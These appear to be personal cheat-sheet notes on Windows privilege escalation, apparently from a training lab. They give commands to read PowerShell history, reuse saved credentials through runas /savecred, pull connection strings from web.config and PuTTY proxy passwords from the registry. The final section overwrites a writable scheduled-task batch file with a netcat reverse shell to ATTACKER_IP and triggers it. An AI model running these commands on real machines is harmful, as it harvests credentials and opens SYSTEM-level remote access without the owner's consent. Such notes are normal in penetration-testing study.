# check permissions on a file
```
icacls c:\tasks\schtask.bat
```
# Powershell History
## cmd
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
## powershell
```
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
# Saved Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
```
cmdkey /list
```
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.
```
runas /savecred /user:admin cmd.exe
```
# IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
Here is a quick way to find database connection strings on the file:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
# Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

# sheduled task (like crond on linux)
```
schtasks /query /tn vulntask /fo list /v
```
check permissions
```
icacls c:\tasks\file
```
`c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)`
As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\<taskfile>
```
## run a task
```
schtasks /run /tn <taskname>
```


